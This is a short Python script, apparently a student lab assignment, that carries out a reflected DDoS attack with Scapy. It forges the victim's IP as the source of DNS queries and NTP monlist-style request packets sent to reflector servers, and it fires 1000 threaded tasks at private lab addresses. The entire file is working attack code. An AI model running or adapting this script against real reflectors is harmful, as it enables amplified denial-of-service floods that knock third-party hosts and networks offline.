"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

Reflected DDoS

This script performs a reflected DDoS using DNS and NTP servers. For more information, see the README.md file.

Usage : python3 main.py
"""
from scapy.all import *
import concurrent.futures
import sys
import time


def dns_ddos(target, dns_server):
    """
    Send a DNS request to the DNS server with the spoofed IP address of the target to perform a reflected DDoS.
    """
    # List of domain names
    dns_hosts = [
        "example.com", "www.example.com", "example.org", "example.be",
        "example.fr", "test.com", "a-very-long-domain-name.com",
        "a-very-long-domain-name.org",
        "oh-boy-i-really-hope-this-domain-name-is-not-used-for-dns-reflection-attacks.oof",
        "i-hope-this-domain-name-is-not-used-for-reflection-attacks.oof",
        "domain.oof"
    ]

    # Send a DNS request for each domain name in the list
    for host in dns_hosts:
        ip = IP(src=target, dst=dns_server)
        udp = UDP(dport=5353)
        dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=host, qtype=225))

        request = (ip / udp / dns)
        send(request)


def ntp_ddos(target, ntp_server):
    """
    Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS.
    """
    data = "\x17\x00\x03\x2a" + "\x00" * 4
    packet = IP(dst=ntp_server, src=target) / \
        UDP(sport=random.randint(2000, 65535), dport=123)/Raw(load=data)
    send(packet)


if __name__ == "__main__":
    target = "10.12.0.10"
    dns_server = "10.12.0.20"
    ntp_server = "10.12.0.30"

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
        futures = []
        for i in range(1000):  # alternating between DNS and NTP attacks
            if (i % 2 == 0):
                futures.append(executor.submit(
                    dns_ddos, target, dns_server))
            else:
                futures.append(executor.submit(
                    ntp_ddos, target, ntp_server))

        # Wait for the tasks to complete
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                executor.shutdown(wait=False)
                print('Time taken :', time.time() - start_time)
                sys.exit(0)
